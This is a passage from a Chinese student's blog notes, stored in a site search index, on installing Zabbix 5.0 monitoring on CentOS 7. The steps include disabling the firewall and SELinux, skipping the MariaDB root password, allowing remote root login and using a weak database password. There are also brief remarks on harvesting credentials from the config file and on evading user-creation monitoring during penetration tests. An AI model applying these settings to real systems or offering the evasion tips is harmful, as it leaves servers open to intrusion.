<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>实训day3-Zabbix</title>
    <link href="/2021/11/28/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E4%B8%89%E5%A4%A9-Zabbix%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/11/28/%E5%AE%9E%E8%AE%AD%E7%AC%AC%E4%B8%89%E5%A4%A9-Zabbix%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="实训第三天-Zabbix搭建"><a href="#实训第三天-Zabbix搭建" class="headerlink" title="实训第三天-Zabbix搭建"></a>实训第三天-Zabbix搭建</h1><h4 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h4><h5 id="Centos7环境"><a href="#Centos7环境" class="headerlink" title="Centos7环境"></a>Centos7环境</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">运行环境</span><br>[root@localhost ~]#  cat /etc/redhat-release<br>CentOS Linux release 7.0.1406 (Core) <br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">永久关闭防火墙和SELinux</span><br>[root@localhost ~]# systemctl disable firewalld.service<br>rm &#x27;/etc/systemd/system/dbus-org.fedoraproject.FirewallD1.service&#x27;<br>rm &#x27;/etc/systemd/system/basic.target.wants/firewalld.service&#x27;<br>[root@localhost ~]# sed -i &#x27;s/SELINUX=enforcing/SELINUX=disabled/&#x27; /etc/selinux/config<br></code></pre></td></tr></table></figure><h5 id="安装LAMP环境"><a href="#安装LAMP环境" class="headerlink" title="安装LAMP环境"></a>安装LAMP环境</h5><p>LAMP：Linux + Apache + Mysql / MariaDB + PHP / Perl / Python</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">检查网络，刚开机，更新下网络，结果发现学校网络用不了阿里云仓库，手机热点支持</span><br>[root@localhost ~]# ping www.baidu.com<br>[root@localhost ~]# dhclient<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">安装apache</span><br>[root@localhost ~]# yum -y install httpd<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">设置apache开机自启动</span><br>[root@localhost ~]# systemctl enable httpd.service<br>ln -s &#x27;/usr/lib/systemd/system/httpd.service&#x27; &#x27;/etc/systemd/system/multi-user.target.wants/httpd.service&#x27;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">启动apache</span><br>[root@localhost ~]# systemctl start httpd.service<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">修改yum文件，修改使用的python版本为2.7</span>   <br>[root@localhost ~]# vim /usr/bin/yum<br><span class="hljs-meta">#</span><span class="bash">!/bin/python2.7</span><br><br>[root@localhost ~]# vim /usr/libexec/urlgrabber-ext-down<br><span class="hljs-meta">#</span><span class="bash">!/bin/python2.7</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 安装 MySQL：安装 MySQL 的社区版即可，即 MariaDB</span> <br>[root@localhost ~]# yum -y install mariadb mariadb-server <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">开机自启 MariaDB 服务</span><br>[root@localhost ~]# systemctl enable mariadb.service<br>ln -s &#x27;/usr/lib/systemd/system/mariadb.service&#x27; &#x27;/etc/systemd/system/multi-user.target.wants/mariadb.service&#x27;<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> 启动 MariaDB 服务</span><br>[root@localhost ~]#  systemctl start mariadb.service<br>[root@localhost ~]# <br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">测试mysql</span><br>[root@localhost ~]# mysql<br>Welcome to the MariaDB monitor.  Commands end with ; or \g.<br>Your MariaDB connection id is 2<br>Server version: 5.5.68-MariaDB MariaDB Server<br><br>Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.<br><br>Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.<br><br>MariaDB [(none)]&gt; exit<br>Bye<br>[root@localhost ~]# <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e54a0f9619724f309a6d06ee1a669b73.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="验证"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 安装 PHP 环境</span> <br>[root@localhost ~]# yum -y install php php-mysql <br></code></pre></td></tr></table></figure><p>准备完毕！</p><h4 id="2-Zabbix5-0的安装"><a href="#2-Zabbix5-0的安装" class="headerlink" title="2.Zabbix5.0的安装"></a>2.Zabbix5.0的安装</h4><p><strong>Zabbix</strong> <strong>官方文档</strong></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section">#官方文档，根据自己的环境查看文档并搭建Zabbix</span><br>https://www.zabbix.com/download? <br>zabbix=5.0&amp;os<span class="hljs-emphasis">_distribution=centos&amp;os_</span>version=8&amp;db=mysql&amp;ws=apache<br></code></pre></td></tr></table></figure><h5 id="下载Zabbix库"><a href="#下载Zabbix库" class="headerlink" title="下载Zabbix库"></a>下载Zabbix库</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">安装Zabbix库</span><br>[root@localhost ~]# rpm -Uvh https://repo.zabbix.com/zabbix/5.0/rhel/7/x86_64/zabbix-release-5.0-1.el7.noarch.rpm<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">一些安装了，出现的问题</span><br>curl: (60) The certificate issuer&#x27;s certificate has expired. Check your system date and time.<br>解决：<br>[root@localhost ~]# yum install ntp -y<br>[root@localhost ~]# ntpdate -u 0.centos.pool.ntp.org    #时差问题，这里校准<br>[root@localhost ~]# yum install ca-certificates      #也可能是ca证书问题，这里更新一下<br>[root@localhost ~]# update-ca-trust extract<br><br>curl: (35) Cannot communicate securely with peer: no common encryption algorithm(s).<br>解决：<br><span class="hljs-meta">#</span><span class="bash">没错，curl出问题了，这里更新一下</span><br>[root@localhost ~]# yum update -y http://pub.mirrors.aliyun.com/centos/7/os/x86_64/Packages/ca-certificates-2020.2.41-70.0.el7_8.noarch.rpm http://pub.mirrors.aliyun.com/centos/7/os/x86_64/Packages/p11-kit-0.23.5-3.el7.x86_64.rpm http://pub.mirrors.aliyun.com/centos/7/os/x86_64/Packages/p11-kit-trust-0.23.5-3.el7.x86_64.rpm<br>[root@localhost ~]# yum update curl -y     <br>[root@localhost ~]# yum makecache fast<br><br>curl: (22) The requested URL returned error: 404 Not Found<br><span class="hljs-meta">#</span><span class="bash">大概率是你命令出错了</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">清下yum缓存</span><br>[root@localhost ~]# yum clean all<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">安装Zabbix服务</span><br>[root@localhost ~]# yum install zabbix-server-mysql zabbix-agent -y<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">安装Zabbix前端（我的流量啊啊啊啊！！！）</span><br>[root@localhost ~]# yum install centos-release-scl -y<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">把前端开关打开，把enabled由0改为1</span><br>[root@localhost ~]# vim /etc/yum.repos.d/zabbix.repo<br>[zabbix-frontend]<br>...<br>enabled=1<br>...<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">安装Zabbix前端包（我的流量啊，嘤嘤嘤）</span><br>[root@localhost ~]# yum install zabbix-web-mysql-scl zabbix-apache-conf-scl -y<br></code></pre></td></tr></table></figure><h5 id="数据库安全设置"><a href="#数据库安全设置" class="headerlink" title="数据库安全设置"></a>数据库安全设置</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# mysql_secure_installation<br><br>Enter current password for root (enter for none): //回车即可<br><br>Set root password? [Y/n] n   //不设置root密码<br> ... skipping.<br><br>Remove anonymous users? [Y/n] y    //移除匿名用户<br> ... Success!<br><br>Disallow root login remotely? [Y/n] n     //允许root远程登陆<br> ... skipping.<br><br>Remove test database and access to it? [Y/n] y  //移除test数据库<br><br>Reload privilege tables now? [Y/n] y    //重载权限表<br> ... Success!<br><br>Cleaning up...<br><br>All done!  If you&#x27;ve completed all of the above steps, your MariaDB<br>installation should now be secure.<br><br>Thanks for using MariaDB!<br>You have new mail in /var/spool/mail/root<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">进行数据库安全设置的作用：</span><br>[root@localhost ~]# mysql<br>MariaDB [(none)]&gt; SHOW DATABASES; //少了test数据库 <br>MariaDB [(none)]&gt; SELECT user,host FROM mysql.user; //多余用户都被移除<br></code></pre></td></tr></table></figure><p>此步骤旨在对数据库做一个简单的优化，没有这条命令，则只能一个个手动删除用户</p><h5 id="创建Zabbix数据库"><a href="#创建Zabbix数据库" class="headerlink" title="创建Zabbix数据库"></a>创建Zabbix数据库</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# mysql<br>MariaDB [(none)]&gt; show databases;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>+--------------------+<br>3 rows in set (0.01 sec)<br><br>MariaDB [(none)]&gt; select current_user();<br>+----------------+<br>| current_user() |<br>+----------------+<br>| root@localhost |<br>+----------------+<br>1 row in set (0.00 sec)<br><br>MariaDB [(none)]&gt; create database zabbix character set utf8 collate utf8_bin;<br>Query OK, 1 row affected (0.00 sec)<br><br>MariaDB [(none)]&gt; create user zabbix@localhost identified by &#x27;qiye&#x27;;<br>Query OK, 0 rows affected (0.01 sec)<br><br>MariaDB [(none)]&gt; flush privileges;<br>Query OK, 0 rows affected (0.00 sec)<br><br>MariaDB [(none)]&gt; grant all privileges on zabbix.* to zabbix@localhost;<br>Query OK, 0 rows affected (0.00 sec)<br><br>MariaDB [(none)]&gt;  SHOW DATABASES;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| zabbix             |<br>+--------------------+<br>4 rows in set (0.00 sec)<br><br>MariaDB [(none)]&gt;  USE zabbix;<br>Database changed<br>MariaDB [zabbix]&gt;  SHOW DATABASES;<br>+--------------------+<br>| Database           |<br>+--------------------+<br>| information_schema |<br>| mysql              |<br>| performance_schema |<br>| zabbix             |<br>+--------------------+<br>4 rows in set (0.00 sec)<br><br>MariaDB [zabbix]&gt;  SHOW TABLES;<br>Empty set (0.00 sec)<br><br>MariaDB [zabbix]&gt; exit<br>Bye<br></code></pre></td></tr></table></figure><h5 id="导入数据库"><a href="#导入数据库" class="headerlink" title="导入数据库"></a>导入数据库</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">首先查询我们要的数据在哪</span><br>[root@localhost ~]# rpm -ql zabbix-server-mysql | grep sql<br>/usr/sbin/zabbix_server_mysql<br>/usr/share/doc/zabbix-server-mysql-5.0.17<br>/usr/share/doc/zabbix-server-mysql-5.0.17/AUTHORS<br>/usr/share/doc/zabbix-server-mysql-5.0.17/COPYING<br>/usr/share/doc/zabbix-server-mysql-5.0.17/ChangeLog<br>/usr/share/doc/zabbix-server-mysql-5.0.17/NEWS<br>/usr/share/doc/zabbix-server-mysql-5.0.17/README<br>/usr/share/doc/zabbix-server-mysql-5.0.17/create.sql.gz<br>/usr/share/doc/zabbix-server-mysql-5.0.17/double.sql<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">导入初始架构和数据</span><br>[root@localhost ~]# zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -pqiye zabbix<br></code></pre></td></tr></table></figure><ul><li>-p 处输入自己指定的密码</li><li>zcat，不看内容解压，通过管道符传输到 zabbix 数据库，或者使用以下的方法，手动导入</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">判断导入是否成功</span><br>[root@localhost ~]# zcat /usr/share/doc/zabbix-server-mysql*/create.sql.gz | mysql -uzabbix -pqiye zabbix<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/b02ee613345942a4b5e6f1c7ab39622d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="导入成功"></p><p>表格出现即代表导入成功</p><h5 id="为Zabbix服务器配置数据库和php"><a href="#为Zabbix服务器配置数据库和php" class="headerlink" title="为Zabbix服务器配置数据库和php"></a>为Zabbix服务器配置数据库和php</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">数据库</span><br>[root@localhost ~]# vim  /etc/zabbix/zabbix_server.conf<br>DBUser=zabbix<br><span class="hljs-meta">#</span><span class="bash"><span class="hljs-comment">## Option: DBPassword</span></span><br><span class="hljs-meta">#</span><span class="bash">       Database password.</span><br><span class="hljs-meta">#</span><span class="bash">       Comment this line <span class="hljs-keyword">if</span> no password is used.</span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># Mandatory: no</span></span><br><span class="hljs-meta">#</span><span class="bash"> Default:</span><br>DBPassword=qiye<br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">php</span><br>[root@localhost ~]# vim  /etc/opt/rh/rh-php72/php-fpm.d/zabbix.conf<br>php_value[max_execution_time] = 300<br>php_value[memory_limit] = 128M<br>php_value[post_max_size] = 16M<br>php_value[upload_max_filesize] = 2M<br>php_value[max_input_time] = 300<br>php_value[max_input_vars] = 10000<br>php_value[date.timezone] = Asia/Shanghai    #把前面的分号去掉，后面改为自己的时区，大陆/城市<br></code></pre></td></tr></table></figure><h5 id="启动Zabbix服务器和代理进程"><a href="#启动Zabbix服务器和代理进程" class="headerlink" title="启动Zabbix服务器和代理进程"></a>启动Zabbix服务器和代理进程</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">重启</span><br>[root@localhost ~]# systemctl restart zabbix-server zabbix-agent httpd rh-php72-php-fpm<br><span class="hljs-meta">#</span><span class="bash">自启</span><br>[root@localhost ~]# systemctl enable zabbix-server zabbix-agent httpd rh-php72-php-fpm<br>Created symlink from /etc/systemd/system/multi-user.target.wants/zabbix-server.service to /usr/lib/systemd/system/zabbix-server.service.<br>Created symlink from /etc/systemd/system/multi-user.target.wants/zabbix-agent.service to /usr/lib/systemd/system/zabbix-agent.service.<br>Created symlink from /etc/systemd/system/multi-user.target.wants/rh-php72-php-fpm.service to /usr/lib/systemd/system/rh-php72-php-fpm.service.<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash">检查端口</span><br>[root@localhost ~]#  netstat -lntup | grep 10051<br>tcp        0      0 0.0.0.0:10051           0.0.0.0:*               LISTEN      4383/zabbix_server  <br>tcp6       0      0 :::10051                :::*                    LISTEN      4383/zabbix_server  <br>[root@localhost ~]#  lsof -i :10051<br></code></pre></td></tr></table></figure><p>在我的主物理机上打开zabbix界面</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">访问 http:<span class="hljs-regexp">//</span>zabbix服务器ip地址<span class="hljs-regexp">/zabbix/</span><br><br>我这里是：<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">241.129</span><span class="hljs-regexp">/zabbix/</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/bed39c22849e4f08839ec68ae28dc448.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>ya<em>da</em>ze！</p><p>首先确保这个页面全是ok的情况</p><p><img src="https://img-blog.csdnimg.cn/1c2c759d7c754d7fa3bb2bac7c829c5f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>输入连接zabbix数据库密码，我的是qiye</p><p><img src="https://img-blog.csdnimg.cn/245b0abf3add4b35b9e831ea338aaa5e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>Name的话，都行</p><p><img src="https://img-blog.csdnimg.cn/a78d01d3ae99442e989195446157c1d8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>ya<em>da</em>ze！</p><p><img src="https://img-blog.csdnimg.cn/b44585966d4a43b29cc5c52c312d5e37.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>关于/etc/zabbix/web/zabbix.conf.php文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# vim /etc/zabbix/web/zabbix.conf.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8ff6506f163647ec980f6ce17ad756bb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix账号和密码"></p><p>可以发现，这里存储着关于zabbix的账户和密码，新的渗透姿势增加了.jpg!</p><p>这里的账号默认Admin，密码默认zabbix</p><p><img src="https://img-blog.csdnimg.cn/f679941bd76e4f43a07841d210d6857b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_15,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>zabbix安装成功！！！</p><p><img src="https://img-blog.csdnimg.cn/d163b1b753774df1b0bb8be22b627c27.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>ya<em>da</em>ze！</p><h4 id="3-增加Zabbix监控主机"><a href="#3-增加Zabbix监控主机" class="headerlink" title="3.增加Zabbix监控主机"></a>3.增加Zabbix监控主机</h4><h5 id="在客户端安装zabbix-agent"><a href="#在客户端安装zabbix-agent" class="headerlink" title="在客户端安装zabbix-agent"></a>在客户端安装zabbix-agent</h5><p>前面的只是监控自己的主机，但在实际情况下，更多的是一台监控多台服务器，因为你不可能为了监控每一台服务器打开每台服务器的zabbix前端页面</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">与前面安装步骤一样</span><br>[root@localhost ~]# rpm -Uvh https://repo.zabbix.com/zabbix/5.0/rhel/7/x86_64/zabbix-release-5.0-1.el7.noarch.rpm <br>[root@localhost ~]# yum clean all <br>[root@localhost ~]# yum -y install zabbix-agent<br></code></pre></td></tr></table></figure><p>PS：<strong>谢谢你，zabbix</strong></p><p><img src="https://img-blog.csdnimg.cn/8c1594aa090a4ada8c5a7ba5cf541b28.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="流量"></p><h5 id="在客户端配置zabbix-agent"><a href="#在客户端配置zabbix-agent" class="headerlink" title="在客户端配置zabbix-agent"></a>在客户端配置zabbix-agent</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">[root@localhost ~]# vim /etc/zabbix/zabbix_agentd.conf <br>:/^Server       #vim开头查询<br>Server=192.168.241.129       #主zabbix服务器ip地址<br></code></pre></td></tr></table></figure><h5 id="在客户端启动zabbix-agent"><a href="#在客户端启动zabbix-agent" class="headerlink" title="在客户端启动zabbix-agent"></a>在客户端启动zabbix-agent</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">重启与自启动</span><br>[root@localhost ~]# systemctl restart zabbix-agent.service <br>[root@localhost ~]# systemctl enable zabbix-agent.service <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d3570e3a651a4d339852744140ba1d64.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p><img src="https://img-blog.csdnimg.cn/0c9fa10b8ac7449d996ae5c14f89ab38.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><p>增加即可，如果不增加模板，不会有以下</p><p><img src="https://img-blog.csdnimg.cn/0855f1758d76452d97d2afaf0dfdd98c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="Zabbix"></p><h4 id="4-自定义监控"><a href="#4-自定义监控" class="headerlink" title="4.自定义监控"></a>4.自定义监控</h4><h5 id="模板自定义监控"><a href="#模板自定义监控" class="headerlink" title="模板自定义监控"></a>模板自定义监控</h5><p><img src="https://img-blog.csdnimg.cn/73b29a6d0ea24d1c8c488754b890cd65.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="模板"></p><p>可以发现，它对/etc/passwd进行监控，没错，对用户的变化进行监控，为了确保安全性</p><p>这就是为什么，平时在渗透时，提权一般不优先创建用户，因为被发现的可能性非常大，所以一般已有用户进行横向渗透。</p><h5 id="自定义监控项"><a href="#自定义监控项" class="headerlink" title="自定义监控项"></a>自定义监控项</h5><p>模板不包含并发连接数、TPS值（iostat命令），只使用模板远远不够，很多时候我们需要添加自定义的</p><p>监控项</p><h6 id="命令行手动取值"><a href="#命令行手动取值" class="headerlink" title="命令行手动取值"></a>命令行手动取值</h6><figure class="highlight 